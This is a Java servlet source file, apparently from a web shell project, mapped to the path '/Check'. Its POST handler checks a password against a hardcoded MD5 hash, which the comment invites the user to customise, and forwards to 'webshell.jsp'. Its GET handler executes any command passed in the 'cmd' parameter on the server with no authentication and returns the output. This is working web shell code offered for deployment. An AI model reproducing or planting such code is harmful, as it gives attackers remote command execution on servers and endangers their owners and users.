package utils;

import java.io.IOException;
import java.util.List;

import javax.servlet.RequestDispatcher;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;


@WebServlet("/Check")
public class Check extends HttpServlet {
	private static final long serialVersionUID = 1L;

	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

		//Customize your hash
		String hash = "81dc9bdb52d04dc20036dbd8313ed055";
		String pass = request.getParameter("pass");

		if(WSHUtils.getMd5(pass).equals(hash)) {
			List<Command> info = WSHUtils.getInfo();

			request.setAttribute("info", info);
			RequestDispatcher dispatcher = request.getRequestDispatcher("/webshell.jsp");
			dispatcher.forward(request, response);
		}
		else {
			
			response.sendRedirect("index.html");
		}
	}

	
	protected void doGet (HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException 
	{
		List<Command> info = WSHUtils.getInfo();
		String runResult = WSHUtils.execute(request.getParameter("cmd"), true);

		request.setAttribute("info", info);
		request.setAttribute("cmd", runResult);
		RequestDispatcher dispatcher = request.getRequestDispatcher("/webshell.jsp");
		dispatcher.forward(request, response);		
	}
}